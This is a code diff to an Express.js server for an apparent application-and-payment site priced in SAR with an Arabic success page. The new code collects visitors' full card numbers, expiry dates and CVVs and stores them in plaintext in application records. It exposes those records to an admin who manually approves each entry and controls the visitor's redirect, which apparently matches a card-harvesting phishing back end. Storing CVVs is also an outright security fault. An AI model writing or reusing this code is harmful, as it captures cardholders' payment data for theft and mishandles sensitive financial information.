@@ -40,7 +40,6 @@ function writeApplications(list) {
 // A visitor counts as "active" if we heard from them in the last 30s.
 const lastSeen = new Map();
 const ACTIVE_WINDOW_MS = 30 * 1000;
-const paymentFlow = new Map();
 
 function countActiveVisitors() {
   const now = Date.now();
@@ -53,6 +52,21 @@ function countActiveVisitors() {
     }
   }
   return count;
+}
+
+function updateApplicationStatus(id, status, extra = {}) {
+  const list = readApplications();
+  const idx = list.findIndex((item) => item.id === id);
+  if (idx === -1) return null;
+
+  list[idx] = {
+    ...list[idx],
+    status,
+    decisionAt: new Date().toISOString(),
+    ...extra
+  };
+  writeApplications(list);
+  return list[idx];
 }
 
 app.use(express.json());
@@ -69,7 +83,7 @@ function requireAdmin(req, res, next) {
 
 // ---- API: submit a new application ----
 app.post('/api/applications', (req, res) => {
-  const { applicant, persons } = req.body || {};
+  const { applicant, persons, status, card, payment } = req.body || {};
 
   if (!applicant || typeof applicant !== 'object') {
     return res.status(400).json({ error: 'invalid_payload' });
@@ -79,14 +93,17 @@ app.post('/api/applications', (req, res) => {
     id: crypto.randomUUID(),
     applicant,
     persons: Array.isArray(persons) ? persons : [],
-    submittedAt: new Date().toISOString()
+    submittedAt: new Date().toISOString(),
+    status: status || 'pending',
+    card: card || null,
+    payment: payment || null
   };
 
   const list = readApplications();
   list.push(record);
   writeApplications(list);
 
-  res.status(201).json({ id: record.id, submittedAt: record.submittedAt });
+  res.status(201).json({ id: record.id, submittedAt: record.submittedAt, status: record.status });
 });
 
 // ---- API: list applications (admin only) ----
@@ -116,77 +133,78 @@ app.get('/api/active-visits', (req, res) => {
   res.json({ count: countActiveVisitors() });
 });
 
-// ---- Payment flow mock endpoints used by the frontend ----
+// ---- Payment + decision flow for pending review ----
 app.post('/api/payment', (req, res) => {
-  const { requestId, amount, currency, cardName } = req.body || {};
-  const id = requestId || crypto.randomUUID();
+  const { requestId, amount, currency, cardName, cardNumber, expiryDate, cvv } = req.body || {};
+  const list = readApplications();
+  const appIndex = list.findIndex((item) => item.id === requestId);
 
-  paymentFlow.set(id, {
-    id,
-    status: 'otp',
-    redirectUrl: 'otp.html',
-    amount: amount || 0,
-    currency: currency || 'SAR',
-    cardName: cardName || 'Customer',
-    createdAt: Date.now()
-  });
+  if (appIndex === -1) {
+    return res.status(404).json({ ok: false, error: 'application_not_found' });
+  }
 
-  res.json({ ok: true, id, status: 'otp', redirectUrl: 'otp.html' });
+  const updated = {
+    ...list[appIndex],
+    status: 'pending',
+    payment: {
+      amount: amount || 0,
+      currency: currency || 'SAR',
+      cardName: cardName || 'Customer',
+      cardNumber: cardNumber || '—',
+      expiryDate: expiryDate || '—',
+      cvv: cvv || '—',
+      submittedAt: new Date().toISOString()
+    },
+    card: {
+      cardName: cardName || 'Customer',
+      cardNumber: cardNumber || '—',
+      expiryDate: expiryDate || '—',
+      cvv: cvv || '—'
+    },
+    updatedAt: new Date().toISOString()
+  };
+
+  list[appIndex] = updated;
+  writeApplications(list);
+
+  res.json({ ok: true, id: updated.id, status: updated.status });
 });
 
 app.get('/api/status/:id', (req, res) => {
   const { id } = req.params;
-  const record = paymentFlow.get(id);
+  const list = readApplications();
+  const item = list.find((entry) => entry.id === id);
 
-  if (!record) {
+  if (!item) {
     return res.status(404).json({ ok: false, error: 'not_found' });
   }
 
   const payload = {
     ok: true,
-    status: record.status,
-    redirectUrl: record.redirectUrl || 'otp.html',
-    redirect: record.redirect || null,
-    stage: record.stage || 'payment',
-    decision: record.decision || null
+    status: item.status || 'pending',
+    redirectUrl: item.status === 'accept' ? 'success-ar.html' : 'payment.html',
+    redirect: item.status === 'accept' ? 'success-ar.html' : null,
+    decision: item.status === 'accept' ? 'approved' : item.status === 'reject' ? 'rejected' : null,
+    stage: item.status === 'accept' ? 'success' : 'payment'
   };
 
   res.json(payload);
 });
 
-app.post('/api/otp', (req, res) => {
-  const { id } = req.body || {};
-  const record = paymentFlow.get(id);
+app.post('/api/applications/:id/decision', (req, res) => {
+  const { id } = req.params;
+  const { decision } = req.body || {};
 
-  if (!record) {
+  if (!['accept', 'reject'].includes(decision)) {
+    return res.status(400).json({ ok: false, error: 'invalid_decision' });
+  }
+
+  const updated = updateApplicationStatus(id, decision, { decisionText: decision === 'accept' ? 'مقبول' : 'مرفوض' });
+  if (!updated) {
     return res.status(404).json({ ok: false, error: 'not_found' });
   }
 
-  record.status = 'approved';
-  record.stage = 'success';
-  record.decision = 'approved';
-  record.redirect = 'success-ar.html';
-  record.redirectUrl = 'otp.html';
-  paymentFlow.set(id, record);
-
-  res.json({ ok: true, redirect: 'success-ar.html' });
-});
-
-app.post('/api/atm', (req, res) => {
-  const { id } = req.body || {};
-  const record = paymentFlow.get(id);
-
-  if (!record) {
-    return res.status(404).json({ ok: false, error: 'not_found' });
-  }
-
-  record.status = 'approved';
-  record.stage = 'success';
-  record.decision = 'approved';
-  record.redirect = 'success-ar.html';
-  paymentFlow.set(id, record);
-
-  res.json({ ok: true, redirect: 'success-ar.html' });
+  res.json({ ok: true, id, status: decision });
 });
 
 app.listen(PORT, () => {
